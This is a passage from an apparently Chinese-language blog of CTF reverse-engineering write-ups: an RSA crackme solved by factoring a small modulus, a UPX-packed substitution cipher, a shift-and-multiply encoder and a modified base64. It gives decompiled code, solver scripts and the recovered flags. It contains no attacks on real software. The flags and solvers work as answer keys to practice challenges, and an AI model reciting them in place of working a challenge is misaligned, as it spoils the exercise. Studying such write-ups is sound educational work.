class="number">8944053</span>)</span><br><span class="line">a15 = <span class="built_in">chr</span>(<span class="number">249527520</span> // <span class="number">5198490</span>)</span><br><span class="line">a16 = <span class="built_in">chr</span>(<span class="number">445362764</span> // <span class="number">4544518</span>)</span><br><span class="line">a17 = <span class="built_in">chr</span>(<span class="number">981182160</span> // <span class="number">10115280</span>)</span><br><span class="line">a18 = <span class="built_in">chr</span>(<span class="number">174988800</span> // <span class="number">3645600</span>)</span><br><span class="line">a19 = <span class="built_in">chr</span>(<span class="number">493042704</span> // <span class="number">9667504</span>)</span><br><span class="line">a20 = <span class="built_in">chr</span>(<span class="number">257493600</span> // <span class="number">5364450</span>)</span><br><span class="line">a21 = <span class="built_in">chr</span>(<span class="number">767478780</span> // <span class="number">13464540</span>)</span><br><span class="line">a22 = <span class="built_in">chr</span>(<span class="number">312840624</span> // <span class="number">5488432</span>)</span><br><span class="line">a23 = <span class="built_in">chr</span>(<span class="number">1404511500</span> // <span class="number">14479500</span>)</span><br><span class="line">a24 = <span class="built_in">chr</span>(<span class="number">316139670</span> // <span class="number">6451830</span>)</span><br><span class="line">a25 = <span class="built_in">chr</span>(<span class="number">619005024</span> // <span class="number">6252576</span>)</span><br><span class="line">a26 = <span class="built_in">chr</span>(<span class="number">372641472</span> // <span class="number">7763364</span>)</span><br><span class="line">a27 = <span class="built_in">chr</span>(<span class="number">373693320</span> // <span class="number">7327320</span>)</span><br><span class="line">a28 = <span class="built_in">chr</span>(<span class="number">498266640</span> // <span class="number">8741520</span>)</span><br><span class="line">a29 = <span class="built_in">chr</span>(<span class="number">452465676</span> // <span class="number">8871876</span>)</span><br><span class="line">a30 = <span class="built_in">chr</span>(<span class="number">208422720</span> // <span class="number">4086720</span>)</span><br><span class="line">a31 = <span class="built_in">chr</span>(<span class="number">515592000</span> // <span class="number">9374400</span>)</span><br><span class="line">a32 = <span class="built_in">chr</span>(<span class="number">719890500</span> // <span class="number">5759124</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (a1,a2,a3,a4,a5,a6,a8,a9,a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a20,a21,a22,a23,a24,a25,a26,a27,a28,a29,a30,a31,a32)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">flag&#123;e165421110ba03099a1c039337&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="SUCTF2019-SignIn"><a href="#SUCTF2019-SignIn" class="headerlink" title="[SUCTF2019]SignIn"></a>[SUCTF2019]SignIn</h2><p>挺好玩的一道题，就是有点依赖工具？</p>
<p>我们看下main函数</p>
<p>和师兄看过一些密码，一看就知道这个东西是rsa，这里借鉴下<a href="https://blog.csdn.net/qin9800">夏了茶糜</a></p>
<p>的rsa讲解</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy82MjM3MDkwLTYzMWU1ZTJlOGUzYTBmOTQucG5n?x-oss-process=image/format,png" alt="img"></p>
<p>图中的C是密文，M是明文，E是公钥（E和 φ(N)互为质数），N是公共模数（质数 P 、Q相乘得到N），MOD就是模运算<br>解密算法：</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy82MjM3MDkwLWJkM2Y5ZjdiNDQ5ODNlODUucG5n?x-oss-process=image/format,png" alt="img"></p>
<p>由此呢我们现在知道的数据如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span><br><span class="line">N = 103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br><span class="line">E = 65537</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-4A0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-490h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-480h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-470h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">112</span>]; <span class="comment">// [rsp+40h] [rbp-460h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">1000</span>]; <span class="comment">// [rsp+B0h] [rbp-3F0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+498h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[sign in]&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[input your flag]: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%99s&quot;</span>, v8);</span><br><span class="line">  sub_96A(v8, v9);</span><br><span class="line">  __gmpz_init_set_str(v7, <span class="string">&quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;</span>, <span class="number">16LL</span>);</span><br><span class="line">  __gmpz_init_set_str(v6, v9, <span class="number">16LL</span>);</span><br><span class="line">  __gmpz_init_set_str(v4, <span class="string">&quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;</span>, <span class="number">10LL</span>);</span><br><span class="line">  __gmpz_init_set_str(v5, <span class="string">&quot;65537&quot;</span>, <span class="number">10LL</span>);</span><br><span class="line">  __gmpz_powm(v6, v6, v5, v4);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)__gmpz_cmp(v6, v7) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;TTTTTTTTTTql!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用<a href="https://nchc.dl.sourceforge.net/project/yafu/1.34/yafu-1.34.zip">https://nchc.dl.sourceforge.net/project/yafu/1.34/yafu-1.34.zip</a> yafu工具去分解N得到p 和 q</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\20138\Desktop\yafu-1.34&gt;yafu-x64.exe</span><br><span class="line">factor(103461035900816914121390101299049044413950405173712170434161686539878160984549)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fac: factoring 103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br><span class="line">fac: using pretesting plan: normal</span><br><span class="line">fac: no tune info: using qs/gnfs crossover of 95 digits</span><br><span class="line">div: primes less than 10000</span><br><span class="line">fmt: 1000000 iterations</span><br><span class="line">rho: x^2 + 3, starting 1000 iterations on C78</span><br><span class="line">rho: x^2 + 2, starting 1000 iterations on C78</span><br><span class="line">rho: x^2 + 1, starting 1000 iterations on C78</span><br><span class="line">pm1: starting B1 = 150K, B2 = gmp-ecm default on C78</span><br><span class="line">ecm: 30/30 curves on C78, B1=2K, B2=gmp-ecm default</span><br><span class="line">ecm: 74/74 curves on C78, B1=11K, B2=gmp-ecm default</span><br><span class="line">ecm: 161/161 curves on C78, B1=50K, B2=gmp-ecm default, ETA: 0 sec</span><br><span class="line"></span><br><span class="line">starting SIQS on c78: 103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br><span class="line"></span><br><span class="line">==== sieving in progress (1 thread):   36224 relations needed ====</span><br><span class="line">====           Press ctrl-c to abort and save state           ====</span><br><span class="line">36319 rels found: 18931 full + 17388 from 186289 partial, (2607.49 rels/sec)</span><br><span class="line"></span><br><span class="line">SIQS elapsed time = 79.8481 seconds.</span><br><span class="line">Total factoring time = 93.8713 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***factors found***</span><br><span class="line"></span><br><span class="line">P39 = 366669102002966856876605669837014229419</span><br><span class="line">P39 = 282164587459512124844245113950593348271</span><br><span class="line"></span><br><span class="line">ans = 1</span><br></pre></td></tr></table></figure>

<p>之后直接用Python的gmpy2模块解密就行了</p>
<p>现在我们有了P、Q和E，我们就可以计算出欧拉函数，然后我们就可以通过欧拉函数φ(N)和公钥E计算出私钥D。<br>使用python的gmpy2库计算私钥。(E * D % φ(N) = 1)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">d = <span class="number">91646299298871237857836940212608056141193465208586711901499120163393577626813</span></span><br></pre></td></tr></table></figure>

<p>计算出私钥d后我们就可以对密文C进行解密，解密算法是（密文C的私钥D次方对公共模数N取余）<br>使用python的gmpy2库计算明文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = gmpy2.powmod(c,d,n)</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="number">185534734614696481020381637136165435809958101675798337848243069</span></span><br></pre></td></tr></table></figure>

<p>把m转为字符串即可！<br>解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">n = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]).decode(encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">suctf&#123;Pwn_@_hundred_years&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Youngter-drive"><a href="#Youngter-drive" class="headerlink" title="Youngter-drive"></a>Youngter-drive</h2><p>upx壳子直接老样子upx3.6解开，去看main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main_0</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HANDLE v4; <span class="comment">// [esp+D0h] [ebp-14h]</span></span><br><span class="line">  HANDLE hObject; <span class="comment">// [esp+DCh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  j_getflag();</span><br><span class="line">  ::hObject = CreateMutexW(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  j_strcpy(Destination, Source);</span><br><span class="line">  hObject = CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//线程1</span></span><br><span class="line">  v4 = CreateThread(<span class="number">0</span>, <span class="number">0</span>, j_fork2, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//线程2</span></span><br><span class="line">  CloseHandle(hObject);<span class="comment">//close 1</span></span><br><span class="line">  CloseHandle(v4);<span class="comment">//close 2</span></span><br><span class="line">  <span class="keyword">while</span> ( dword_418008 != <span class="number">-1</span> )</span><br><span class="line">    ;</span><br><span class="line">  j_result();</span><br><span class="line">  CloseHandle(::hObject);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们跟进线程1去康康</p>
<p>发现他会对数据进行加密操作，我们去康康怎么加密的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __stdcall <span class="title">StartAddress_0</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    WaitForSingleObject(hObject, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dword_418008 &gt; <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      j_en((<span class="keyword">int</span>)Source, dword_418008);</span><br><span class="line">      --dword_418008;</span><br><span class="line">      Sleep(<span class="number">0x64</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    ReleaseMutex(hObject);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如下，不难发现先做了次字母判断，然后判断大小写，大写字母的明文加密如下</p>
<p>a2 + a1代表的就是明文，off_418000是密钥</p>
<p>*(_BYTE <em>)(a2 + a1) =off_418000[0][</em>(char *)(a2 + a1) - 38];这部分加密的意思就是</p>
<p>将密钥中的[0][明文-38]对应的字符当成密文，小写字母同理。</p>
<p>那么逆向思维下就是大写字母加38小写字母加96算法简直是一模一样的=-=</p>
<p>但是坑爹的在后面</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">en</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+D3h] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(_BYTE *)(a2 + a1);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span>) &amp;&amp; (v3 &lt; <span class="number">65</span> || v3 &gt; <span class="number">90</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    *(_BYTE *)(a2 + a1) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(a2 + a1) - <span class="number">38</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    *(_BYTE *)(a2 + a1) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(a2 + a1) - <span class="number">96</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们刚才说了有两个线程</p>
<p>相当于主线程分开两部分指向，线程1结束执行线程2，我们还要去康康线程2干嘛了</p>
<p>并没对数据进行处理只是dword_418008-1，线程1也有。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __stdcall <span class="title">fork2</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    WaitForSingleObject(hObject, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dword_418008 &gt; <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Sleep(<span class="number">0x64</span>u);</span><br><span class="line">      --dword_418008;</span><br><span class="line">    &#125;</span><br><span class="line">    ReleaseMutex(hObject);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到主函数看如果dword_418008减到0了就会结束整个程序。</p>
<p>意思很明确了，对于明文加密，明文当成数组，奇数位置的就加密，偶数位置不变，由此exp如下</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flagpart = <span class="string">&#x27;TOiZiZtOrYaToUwPnToBsOaOapsyS&#x27;</span></span><br><span class="line">flagrange = <span class="string">&#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flagpart)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flag += flagpart[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> flagpart[i].isupper():</span><br><span class="line">            flag += <span class="built_in">chr</span>(flagrange.find(flagpart[i]) + <span class="number">96</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(flagrange.find(flagpart[i]) + <span class="number">38</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="WUSTCTF2020-level1"><a href="#WUSTCTF2020-level1" class="headerlink" title="[WUSTCTF2020]level1"></a>[WUSTCTF2020]level1</h2><p>给了加密结果，加密方法在main</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> ptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, <span class="number">0x14</span>uLL, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(ptr[i] &lt;&lt; i));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i * ptr[i]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接把左移改右移，*改成/就行了</p>
<p>exp如下</p>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">198</span>,<span class="number">232</span>,<span class="number">816</span>,<span class="number">200</span>,<span class="number">1536</span>,<span class="number">300</span>,<span class="number">6144</span>,<span class="number">984</span>,<span class="number">51200</span>,<span class="number">570</span>,<span class="number">92160</span>,<span class="number">1200</span>,<span class="number">565248</span>,<span class="number">756</span>,<span class="number">1474560</span>,<span class="number">800</span>,<span class="number">6291456</span>,<span class="number">1782</span>,<span class="number">65536000</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">    <span class="keyword">if</span> ((i+<span class="number">1</span>) &amp; <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i] &gt;&gt; (i+<span class="number">1</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">chr</span>(a[i] // (i+<span class="number">1</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ACTF新生赛2020-usualCrypt"><a href="#ACTF新生赛2020-usualCrypt" class="headerlink" title="[ACTF新生赛2020]usualCrypt"></a>[ACTF新生赛2020]usualCrypt</h2><p>main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5[<span class="number">3</span>]; <span class="comment">// [esp+8h] [ebp-74h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+14h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+16h] [ebp-66h]</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">100</span>]; <span class="comment">// [esp+18h] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_403CF8(&amp;unk_40E140);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v8);</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  magicbase64(v8, <span class="built_in">strlen</span>(v8), v5);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)v5 + v3) == byte_40E0E4[v3] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)v5) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_403CF8(aError);</span><br><span class="line">LABEL_6:</span><br><span class="line">  <span class="keyword">if</span> ( v3 - <span class="number">1</span> == <span class="built_in">strlen</span>(byte_40E0E4) )</span><br><span class="line">    result = sub_403CF8(aAreYouHappyYes);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = sub_403CF8(aAreYouHappyNo);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>魔改base64加密如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">magicbase64</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+18h] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  magic();</span><br><span class="line">  v5 = a2 % <span class="number">3</span>;</span><br><span class="line">  v6 = a1;</span><br><span class="line">  v7 = a2 - a2 % <span class="number">3</span>;</span><br><span class="line">  v15 = a2 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(v5) = *(_BYTE *)(a1 + v3);</span><br><span class="line">      v3 += <span class="number">3</span>;</span><br><span class="line">      v8 = v4 + <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(v8 + a3 - <span class="number">1</span>) = byte_40E0A0[(v5 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">      *(_BYTE *)(++v8 + a3 - <span class="number">1</span>) = byte_40E0A0[<span class="number">16</span> * (*(_BYTE *)(a1 + v3 - <span class="number">3</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                            + (((<span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(a1 + v3 - <span class="number">2</span>) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>)];</span><br><span class="line">      *(_BYTE *)(++v8 + a3 - <span class="number">1</span>) = byte_40E0A0[<span class="number">4</span> * (*(_BYTE *)(a1 + v3 - <span class="number">2</span>) &amp; <span class="number">0xF</span>)</span><br><span class="line">                                            + (((<span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(a1 + v3 - <span class="number">1</span>) &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>)];</span><br><span class="line">      v5 = *(_BYTE *)(a1 + v3 - <span class="number">1</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">      v4 = v8 + <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(v4 + a3 - <span class="number">1</span>) = byte_40E0A0[v5];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; v7 );</span><br><span class="line">    v5 = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v7) = *(_BYTE *)(v3 + a1);</span><br><span class="line">    v9 = v4 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v9 + a3 - <span class="number">1</span>) = byte_40E0A0[(v7 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v10 = v9 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v10 + a3 - <span class="number">1</span>) = byte_40E0A0[<span class="number">16</span> * (*(_BYTE *)(v3 + a1) &amp; <span class="number">3</span>)];</span><br><span class="line">    *(_BYTE *)(v10 + a3) = <span class="number">61</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">    v13 = v10 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v13 + a3) = <span class="number">61</span>;</span><br><span class="line">    v4 = v13 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v4 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v11 + a3 - <span class="number">1</span>) = byte_40E0A0[((<span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v3 + a1) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v12 = (_BYTE *)(v3 + a1 + <span class="number">1</span>);</span><br><span class="line">    LOBYTE(v6) = *v12;</span><br><span class="line">    v10 = v11 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v10 + a3 - <span class="number">1</span>) = byte_40E0A0[<span class="number">16</span> * (*(_BYTE *)(v3 + a1) &amp; <span class="number">3</span>) + ((v6 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>)];</span><br><span class="line">    *(_BYTE *)(v10 + a3) = 